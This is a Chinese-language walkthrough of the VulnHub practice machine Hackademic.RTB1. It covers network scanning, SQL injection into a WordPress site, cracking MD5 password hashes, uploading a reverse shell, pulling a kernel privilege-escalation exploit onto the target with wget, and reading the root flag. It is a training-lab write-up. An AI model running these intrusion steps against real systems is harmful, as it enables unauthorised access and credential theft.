# hackademic-rtb1 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/hackademic-rtb1,17/
-   下载地址：https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip



## 信息收集：

### 主机发现：

```shell
└─$ sudo netdiscover -i eth0 -r 192.168.2.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts               
                                                                             
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240             
 ____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname     
 ----------------------------------------------------------------------------
 192.168.2.1     aa:a1:59:52:23:67      1      60  Unknown vendor            
 192.168.2.2     00:50:56:e9:75:ca      1      60  VMware, Inc.              
 192.168.2.140   00:0c:29:b7:25:81      1      60  VMware, Inc.              
 192.168.2.254   00:50:56:f3:2e:7c      1      60  VMware, Inc.              

```



### 端口扫描

```shell
# 扫描TCP端口
└─$ sudo nmap -sT -T 5 -p- 192.168.2.140 -oA Nmapscan/st-ports  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 14:23 HKT
Nmap scan report for 192.168.2.140
Host is up (0.00043s latency).
Not shown: 65452 filtered tcp ports (no-response), 81 filtered tcp ports (host-unreach)
PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
MAC Address: 00:0C:29:B7:25:81 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 77.46 seconds
```





### 服务及操作系统扫描

```shell
└─$ sudo nmap -sC -sV -O -p22,80 -T 4 192.168.2.140 -oA Nmapscan/sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 14:27 HKT
Nmap scan report for 192.168.2.140
Host is up (0.00039s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.15 (Fedora)
|_http-title: Hackademic.RTB1  
MAC Address: 00:0C:29:B7:25:81 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.22 - 2.6.36
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds

```



### 常规漏洞扫描

```shell
└─$ sudo nmap --script=vuln -p22,80 192.168.2.140 -oA Nmapscan/Script
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 14:29 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.140
Host is up (0.00046s latency).

PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://www.securityfocus.com/bid/49303
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
MAC Address: 00:0C:29:B7:25:81 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 171.36 seconds
```





## web发现

-   主界面发现存在sql注入

-   ![image-20230602085017183](https://raw.githubusercontent.com/r0o983/images/main/image-20230602085017183.png)

-   尝试手工注入：

    -   ![image-20230602085518053](https://raw.githubusercontent.com/r0o983/images/main/image-20230602085518053.png)

    -   当前页面存在输出5列数据，使用`union select 1,2,3,4,5` 找到回显点

    -   ![image-20230602085652500](https://raw.githubusercontent.com/r0o983/images/main/image-20230602085652500.png)

    -   查看当前的数据库，用户，以及使用的数据库版本，对应的命令：version(),database(),users()

    -   ![image-20230602085948303](https://raw.githubusercontent.com/r0o983/images/main/image-20230602085948303.png)

    -   查看当前版本的`wordpress`的数据库是如何进行构建的，[点我查看](https://codex.wordpress.org/Database_Description/1.5)

    -   ![image-20230602090347046](https://raw.githubusercontent.com/r0o983/images/main/image-20230602090347046.png)

    -   当前版本数据库存在以上两个字段，尝试从前端进行读取，由于limit限制了读取的数据，这里直接使用`group_concat`进行联合输出

    -   ![image-20230602090809177](https://raw.githubusercontent.com/r0o983/images/main/image-20230602090809177.png)

    -   可以正常进行回显，使用ascii编码进行分割数据，使其具有高可读性。

    -   ```shell
        └─$ ascii
        Usage: ascii [-adxohv] [-t] [char-alias...]
           -t = one-line output  -a = vertical format
           -d = Decimal table  -o = octal table  -x = hex table  -b binary table
           -h = This help screen -v = version information
        Prints all aliases of an ASCII character. Args may be chars, C \-escapes,
        English names, ^-escapes, ASCII mnemonics, or numerics in decimal/octal/hex.
        
        Dec Hex    Dec Hex    Dec Hex  Dec Hex  Dec Hex  Dec Hex   Dec Hex   Dec Hex  
          0 00 NUL  16 10 DLE  32 20    48 30 0  64 40 @  80 50 P   96 60 `  112 70 p
          1 01 SOH  17 11 DC1  33 21 !  49 31 1  65 41 A  81 51 Q   97 61 a  113 71 q
          2 02 STX  18 12 DC2  34 22 "  50 32 2  66 42 B  82 52 R   98 62 b  114 72 r
          3 03 ETX  19 13 DC3  35 23 #  51 33 3  67 43 C  83 53 S   99 63 c  115 73 s
          4 04 EOT  20 14 DC4  36 24 $  52 34 4  68 44 D  84 54 T  100 64 d  116 74 t
          5 05 ENQ  21 15 NAK  37 25 %  53 35 5  69 45 E  85 55 U  101 65 e  117 75 u
          6 06 ACK  22 16 SYN  38 26 &  54 36 6  70 46 F  86 56 V  102 66 f  118 76 v
          7 07 BEL  23 17 ETB  39 27 '  55 37 7  71 47 G  87 57 W  103 67 g  119 77 w
          8 08 BS   24 18 CAN  40 28 (  56 38 8  72 48 H  88 58 X  104 68 h  120 78 x
          9 09 HT   25 19 EM   41 29 )  57 39 9  73 49 I  89 59 Y  105 69 i  121 79 y
         10 0A LF   26 1A SUB  42 2A *  58 3A :  74 4A J  90 5A Z  106 6A j  122 7A z
         11 0B VT   27 1B ESC  43 2B +  59 3B ;  75 4B K  91 5B [  107 6B k  123 7B {
         12 0C FF   28 1C FS   44 2C ,  60 3C <  76 4C L  92 5C \  108 6C l  124 7C |
         13 0D CR   29 1D GS   45 2D -  61 3D =  77 4D M  93 5D ]  109 6D m  125 7D }
         14 0E SO   30 1E RS   46 2E .  62 3E >  78 4E N  94 5E ^  110 6E n  126 7E ~
         15 0F SI   31 1F US   47 2F /  63 3F ?  79 4F O  95 5F _  111 6F o  127 7F DEL
        ```

    -   将获得的账号密码进行破解。

    -   ![image-20230602092428666](https://raw.githubusercontent.com/r0o983/images/main/image-20230602092428666.png)

-   使用john对得到的密码进行破解

-   ```shell
    └─$ cat crask-user                                    
    NickJames:21232f297a57a5a743894a0e4a801fc3
    JohnSmith:b986448f0bb9e5e124ca91d3d650f52c
    GeorgeMiller:7cbb3252ba6b7e9c422fac5334d22054
    TonyBlack:a6e514f9486b83cb53d8d932f9a04292
    JasonKonnors:8601f6e1028a8e8a966f6c33fcd9aec4
    MaxBucky:50484c19f1afdaf3841a0d821ed393d2
    
    └─$ john --format=Raw-MD5 crask-user --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 6 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Press 'q' or Ctrl-C to abort, almost any other key for status
    maxwell          (JasonKonnors)     
    napoleon         (TonyBlack)     
    q1w2e3           (GeorgeMiller)     
    admin            (NickJames)     
    PUPPIES          (JohnSmith)     
    kernel           (MaxBucky)     
    6g 0:00:00:00 DONE (2023-05-30 20:16) 600.0g/s 8524Kp/s 8524Kc/s 17625KC/s lashan..joey33
    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
    Session completed. 
    ```



### 登陆测试

查找wordpress管理后台，一般情况下的管理后台地址为：`wp-admin`

-   使用密码依次尝试登陆
-   ![image-20230602092937395](https://raw.githubusercontent.com/r0o983/images/main/image-20230602092937395.png)
-   经过最终测试，发现只有`GeorgeMiller`用户具有管理员权限，直接选择开启上传，和增加可上传的类型
-   ![image-20230602093058547](https://raw.githubusercontent.com/r0o983/images/main/image-20230602093058547.png)
-   上传反弹shell成功，并展示了上传的路径
-   ![image-20230602093429115](https://raw.githubusercontent.com/r0o983/images/main/image-20230602093429115.png)



### 获得反弹shell

-   建立监听并尝试访问反弹shell

-   ```shell
    └─$ sudo nc -nvlp 1234                        
    [sudo] password for kali: 
    listening on [any] 1234 ...
    connect to [192.168.2.128] from (UNKNOWN) [192.168.2.140] 53776
    bash: no job control in this shell
    bash-4.0$ whoami
    whoami
    apache
    bash-4.0$ ip a
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:b7:25:81 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.140/24 brd 192.168.2.255 scope global eth1
        inet6 fe80::20c:29ff:feb7:2581/64 scope link 
           valid_lft forever preferred_lft forever
    bash-4.0$ uname -a
    uname -a
    Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
    bash-4.0$ sudo -l
    sudo -l
    sudo: sorry, you must have a tty to run sudo
    
    bash-4.0$ python -c 'import pty;pty.spawn("/bin/bash")';
    python -c 'import pty;pty.spawn("/bin/bash")';
    bash-4.0$ sudo -l
    sudo -l
    [sudo] password for apache: 
    sudo: 3 incorrect password attempts
    bash-4.0$ 
    ```

-   使用内核提权，查找匹配当前内核版本的exploit

-   经过多次尝试，确定当前版本适用于`linux/local/15285.c`

-   ![image-20230602094430724](https://raw.githubusercontent.com/r0o983/images/main/image-20230602094430724.png)

-   ```shell
    └─$ searchsploit Linux kernel 2.6.3 -m 15285.c                     
    [!] Could not find EDB-ID #
    
    
    [!] Could not find EDB-ID #
    
    
      Exploit: Microsoft IIS 5.0 - WebDAV Remote
          URL: https://www.exploit-db.com/exploits/2
         Path: /usr/share/exploitdb/exploits/windows/remote/2.c
        Codes: OSVDB-4467, CVE-2003-0109
     Verified: True
    File Type: Unicode text, UTF-8 text
    Copied to: /home/kali/Documents/WalkThrough/hackademic-rtb1/2.c
    
    
      Exploit: Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation
          URL: https://www.exploit-db.com/exploits/15285
         Path: /usr/share/exploitdb/exploits/linux/local/15285.c
        Codes: CVE-2010-3904
     Verified: True
    File Type: C source, ASCII text
    Copied to: /home/kali/Documents/WalkThrough/hackademic-rtb1/15285.c
    ```

-   将文件传输到靶机中，并尝试利用

-   ```shell
    bash-4.0$ cd /tm
    cd /tmp/
    bash-4.0$ wget http://192.168.2.128/15285.c
    wget http://192.168.2.128/15285.c
    --2023-05-30 00:32:36--  http://192.168.2.128/15285.c
    Connecting to 192.168.2.128:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 6860 (6.7K) [text/x-c]
    Saving to: `15285.c'
    
     0% [                                       ] 0           --.-K/s            100%[======================================>] 6,860       --.-K/s   in 0s      
    
    2023-05-30 00:32:36 (81.8 MB/s) - `15285.c' saved [6860/6860]
    ```

-   编译并利用：

-   ```shell
    bash-4.0$ gcc 15285.c -o 15285
    gcc 15285.c -o 15285
    bash-4.0$ ./15
    ./15285 
    [*] Linux kernel >= 2.6.30 RDS socket exploit
    [*] by Dan Rosenberg
    [*] Resolving kernel addresses...
     [+] Resolved security_ops to 0xc0aa19ac
     [+] Resolved default_security_ops to 0xc0955c6c
     [+] Resolved cap_ptrace_traceme to 0xc055d9d7
     [+] Resolved commit_creds to 0xc044e5f1
     [+] Resolved prepare_kernel_cred to 0xc044e452
    [*] Overwriting security ops...
    [*] Overwriting function pointer...
    [*] Triggering payload...
    [*] Restoring function pointer...
    [*] Got root!
    sh-4.0# ls
    ls
    15023.c  15285  15285.c  34923.c  orbit-gdm  pulse-PKdhtXMmr18n
    sh-4.0# whoami  
    whoami
    root
    sh-4.0# ip a
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:b7:25:81 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.140/24 brd 192.168.2.255 scope global eth1
        inet6 fe80::20c:29ff:feb7:2581/64 scope link 
           valid_lft forever preferred_lft forever
    sh-4.0# 
    ```

-   获得flag

-   ```shell
    sh-4.0# python -c 'import pty;pty.spawn("/bin/bash")';
    python -c 'import pty;pty.spawn("/bin/bash")';
    [root@HackademicRTB1 tmp]# cd /root     
    cd /root
    [root@HackademicRTB1 root]# ls
    ls
    Desktop  anaconda-ks.cfg  key.txt  key.txt~
    [root@HackademicRTB1 root]# cat key.txt
    cat key.txt
    Yeah!!
    You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
    
    $_d&jgQ>>ak\#b"(Hx"o<la_%
    
    Regards,
    mr.pr0n || p0wnbox.Team || 2011
    http://p0wnbox.com
    
    [root@HackademicRTB1 root]# 
    
    ```
